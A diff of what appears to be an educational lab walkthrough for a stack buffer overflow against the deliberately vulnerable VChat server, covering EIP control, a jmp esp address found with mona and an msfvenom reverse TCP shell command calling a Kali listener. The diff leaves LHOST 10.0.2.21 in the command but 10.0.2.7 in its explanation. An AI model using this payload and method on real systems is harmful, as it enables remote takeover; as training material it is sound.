@@ -200,50 +200,40 @@ This means:
   
 4. Now modify the exploit program to reflect the code in the [exploit2.py](./SourceCode/exploit2.py) script and run the exploit against VChat.
    * We do this to validate that we have the correct offset for the return address!
-   * See that the EIP contains a series of the value `0x42`, which `B`. This tells us that we can write an address to that location in order to change the control flow of the target program. We use the character 'B' as this stands out in the stack when we are examining the program under a debugger, and this is also an address that will lead to a crashed system state immediately if we try to execute it. This way, we can more easily examine the behavior of the process and find the root cause.
-		* *Note:* It sometimes takes a few runs for this to work and update on Immunity Debugger within the VirtualBox VM.
+   * See that the EIP contains a series of the value `0x42`, i.e., `B`. This tells us that we can write an address to that location in order to change the control flow of the target program. We use the character 'B' as this stands out in the stack when we are examining the program under a debugger, and this is also an address that will lead to a crashed system state immediately if we try to execute it. This way, we can more easily examine the behavior of the process and find the root cause.
+   * *Note:* It sometimes takes a few runs for this to work and update on Immunity Debugger within the VirtualBox VM.
 
-6. Open the `Executable Modules` window from the **views** tab in Immunity Debugger. This allows us to see the memory offsets of each dependency VChat uses. This will help inform us as to which `jmp esp` instruction we should pick, since we want to avoid any *Windows dynamic libraries* since their base addresses may vary between executions and Windows systems.
+5. Open the `Executable Modules` window from the **views** tab in Immunity Debugger. This allows us to see the memory offsets of each dependency VChat uses. This will help inform us as to which `jmp esp` instruction we should pick, since we want to avoid any *Windows dynamic libraries* since their base addresses may vary between executions and Windows systems.
 
-	<img src="Images/I13.png" width=800>
-
-7. Use the command `!mona jmp -r esp -cp nonull -o` in the Immunity Debugger's GUI command line to find some `jmp esp` instructions.
+6. Use the command `!mona jmp -r esp -cp nonull -o` in the Immunity Debugger's GUI command line to find some `jmp esp` instructions.
 
 	The address of a `jmp esp` instruction will be used to overwrite the return address of the victim function so that when the victim function returns, `jmp esp` gets running. When `jmp esp` runs, it jumps to the location referred to by the `ESP` register (stack top), where the shellcode will be put.
 
-	<img src="Images/I14.png" width=800>
+	<img src="Images/TRUN-jmpEsp.png" width=800>
 
 	- The `-r esp` flag tells *mona.py* to search for the `jmp esp` instruction.
 	- The `-cp nonull` flag tells *mona.py* to ignore null values.
 	- The `-o` flag tells *mona.py* to ignore OS modules.
 	- We can select any output from this.
 
-	<img src="Images/I15.png" width=800>
-
-	We can see there are nine possible `jmp esp` instructions in the *essfunc* dll that we can use, any of the possible options should work. We will use the last one, `0x6250151e`
+	We can see there are nine possible `jmp esp` instructions in the *essfunc* dll that we can use, any of the possible options should work. We will use the last one, `0x625026D3`
 
 8. Modify your exploit program to reflect the [exploit3.py](./SourceCode/exploit3.py) script, we use this to verify that the `jmp esp` address we inject works.
    1. Click on the black button highlighted below, and enter the address we decided in the previous step.
 
-		<img src="Images/I16.png" width=800>
+		<img src="Images/TRUN-Go2Addr.png" width=800>
 
    2. Set a breakpoint at the desired address (right-click).
 
-		<img src="Images/I17.png" width=800>
+		<img src="Images/TRUN-jmpEsp-Dbg.png" width=800>
 
    3. Run the [exploit3.py](./SourceCode/exploit3.py) program till an overflow occurs (See EIP/ESP and stack changes and the message at the bottom of the screen).
 
-		<img src="Images/I18.png" width=800>
-
          * Notice that the EIP now points to an essfunc.dll address!
-	4. Once the overflow occurs, click the *step into* button highlighted below.
+   
+   4. Once the overflow occurs, click the *step over* button highlighted below.
 
-		<img src="Images/I19.png" width=800>
-
-	5. Notice that we jumped to the stack; we just overflowed!
-
-		<img src="Images/I20.png" width=800>
-
+   5. Notice that we jumped to the stack; we just overflowed!
 
 Now that we have all the necessary parts for the creation of a exploit we will discuss what we have done so far (the **exploit.py** files), and how we can now expand our efforts to gain a shell in the target machine.
 
@@ -253,11 +243,11 @@ Up until this point in time,  we have been performing [Denial of Service](https:
 1. We first need to generate some shell code to inject into the process. We will use the [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) tool to both generate shellcode and encode it to ensure it is transmitted properly. We **must** encode the resulting shellcode so it does not contain any null bytes `0x0`, carriage returns `\r` or newlines `\n`, as their presence would prevent the shellcode from properly executing by breaking the transmission, reception or execution of the shellcode. **Note**: you may need to type the command since copy and paste may not work.
 
 	```sh
-	msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.7 LPORT=8080 EXITFUNC=thread -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
+	msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.21 LPORT=8080 EXITFUNC=thread -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
 	```
 	* `-p `: Payload we are generating shellcode for.
     	* `windows/shell_reverse_tcp`: Reverse TCP payload for Windows.
-    	* `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP `10.0.2.7`.
+    	* `LHOST=10.0.2.21`: The remote listening host's IP, in this case our Kali machine's IP `10.0.2.7`.
     	* `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080.
     	* `EXITFUNC=thread`: Create a thread to run the payload.
 	* `-f`: The output format.
@@ -283,21 +273,12 @@ Up until this point in time,  we have been performing [Denial of Service](https:
 5. Run VChat directly or Examine Immunity Debugger with a Break Point during the Exploit's execution.
 Now, we can run VChat directly. Alternatively, we can run VChat in Immunity Debugger and examine a few things. So, the following steps are optional.
    1. As done previously, goto the `jmp esp` instruction
+   2. Set a breakpoint and launch the exploit
+   3. Click the *Step* function a few times, it may look like we are not doing anything (Depending on your padding), however after some number of steps we should arrive at the shellcode as shown below!
+   4. Once you are satisfied we are executing the shell code, click the continue (Red arrow) button to allow it to execute.
+   5. Look around in your Netcat terminal! You should see a shell like the one shown below. Just note that Windows Defender may kill it if you have it's protections enabled!
 
-		<img src="Images/I21.png" width=800>
-
-    2. Set a breakpoint and launch the exploit
-
-		<img src="Images/I22.png" width=800>
-
-    3. Click the *Step* function a few times, it may look like we are not doing anything (Depending on your padding), however after some number of steps we should arrive at the shellcode as shown below!
-
-		<img src="Images/I23.png" width=800>
-
-     4. Once you are satisfied we are executing the shell code, click the continue (Red arrow) button to allow it to execute.
-1. Look around in your Netcat terminal! You should see a shell like the one shown below. Just note that Windows Defender may kill it if you have it's protections enabled!
-
-	<img src="Images/I24.png" width=800>
+	<img src="Images/TRUN-nc.png" width=800>
 
 2. Once done, exit the Netcat program with ```Ctl+C``` to signal and kill the process.
 
